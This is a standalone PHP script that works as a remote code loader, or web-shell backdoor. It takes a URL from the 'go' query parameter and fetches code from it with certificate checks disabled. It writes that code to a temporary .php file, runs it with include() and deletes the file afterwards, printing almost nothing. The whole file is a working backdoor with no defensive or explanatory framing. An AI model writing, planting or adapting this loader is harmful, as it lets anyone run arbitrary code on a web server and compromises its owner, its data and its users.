<?php
if (isset($_GET['go'])) {$url = filter_var($_GET['go'], FILTER_VALIDATE_URL);
    if ($url) {
        $ch = curl_init($url); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $php_code = curl_exec($ch);
        if (curl_errno($ch)) {echo ' ' . curl_error($ch);
        } else {
            $mime_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            if (strpos($mime_type, 'text/plain') !== false || strpos($mime_type, 'application/x-php') !== false) {
                $temp_file = sys_get_temp_dir() . '/temp_php_file_' . uniqid() . '.php';
                $attempts = 0;
                $max_attempts = 5; 
                $write_status = false;
                while ($attempts < $max_attempts) {
                    $write_status = file_put_contents($temp_file, $php_code);
                    if ($write_status !== false && file_exists($temp_file)) {
                        break;
                    }
                    $attempts++;
                    $temp_file = sys_get_temp_dir() . '/temp_php_file_' . uniqid() . '.php';
                    sleep(1); 
                }
                if ($write_status === false) {
                    echo "" . sys_get_temp_dir() . "<br>";
                } else {
                    echo "" . $temp_file . "<br>";
                    if (file_exists($temp_file)) {
                        try {
                            include($temp_file);
                        } catch (Exception $e) {
                            echo '' . $e->getMessage();
                        } finally {
                            unlink($temp_file);
                            echo "" . $temp_file . "<br>";
                        }
                    } else {
                        echo "" . $temp_file . "<br>";
                    }
                }
            } else {
                echo "";
            }
        }
        curl_close($ch);
    } else {
        echo "";
    }
} else {
    echo "";
}
?>